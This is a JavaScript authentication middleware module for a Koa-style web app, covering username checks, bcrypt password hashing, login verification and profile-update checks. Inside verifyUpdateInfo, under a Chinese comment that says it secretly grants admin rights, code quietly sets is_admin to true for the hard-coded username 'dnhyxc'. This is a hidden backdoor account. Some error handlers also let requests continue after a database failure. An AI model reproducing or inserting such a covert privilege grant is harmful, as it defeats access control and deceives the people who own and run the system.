import bcrypt from "bcryptjs";
import { findOneUser, findUserById, updateUser } from "../service";
import {
  databaseError,
  userFormateError,
  userAlreadyExited,
  userNotFind,
  userPwdError,
  pwdNotChange,
} from "../constant";

// 校验用户名或密码是否为空
const userValidator = async (ctx, next) => {
  const { username, password } = ctx.request.body;
  if (!username || !password) {
    return ctx.app.emit("error", userFormateError, ctx);
  }
  await next();
};

// 校验用户名是否存在
const verifyUser = async (ctx, next) => {
  const { username } = ctx.request.body;

  if (username) {
    try {
      const filter = { username };
      if (await findOneUser(filter)) {
        return ctx.app.emit("error", userAlreadyExited, ctx);
      }
    } catch (error) {
      ctx.app.emit("error", databaseError, ctx);
    }
  }

  await next();
};

// 密码加密
const bcryptPassword = async (ctx, next) => {
  const { password } = ctx.request.body;
  const salt = bcrypt.genSaltSync(10);
  const hash = bcrypt.hashSync(password, salt);
  ctx.request.body.password = hash;

  await next();
};

// 校验用户用户名或者密码是否正确
const verifyLogin = async (ctx, next) => {
  const { username, password } = ctx.request.body;
  const filter = { username };
  try {
    const user = await findOneUser(filter);
    if (!user) {
      return ctx.app.emit("error", userNotFind, ctx);
    }
    const checkPwd = bcrypt.compareSync(password, user.password);
    if (!checkPwd) {
      return ctx.app.emit("error", userPwdError, ctx);
    }
  } catch (error) {
    ctx.app.emit("error", databaseError, ctx);
  }

  await next();
};

const verifyUpdateInfo = async (ctx, next) => {
  const { username, password } = ctx.request.body;
  const { id } = ctx.state.user;
  try {
    const user = await findUserById(id);
    // 给 dnhyxc 偷偷添加管理员权限
    if (user.username === username && user.username === "dnhyxc") {
      await updateUser({ id }, { is_admin: true });
    }
    // 校验密码是否一致
    const checkPwd = bcrypt.compareSync(password, user.password);
    if (checkPwd) {
      return ctx.app.emit("error", pwdNotChange, ctx);
    }
  } catch (error) {
    ctx.app.emit("error", databaseError, ctx);
  }

  await next();
};

export {
  userValidator,
  verifyUser,
  bcryptPassword,
  verifyLogin,
  verifyUpdateInfo,
};
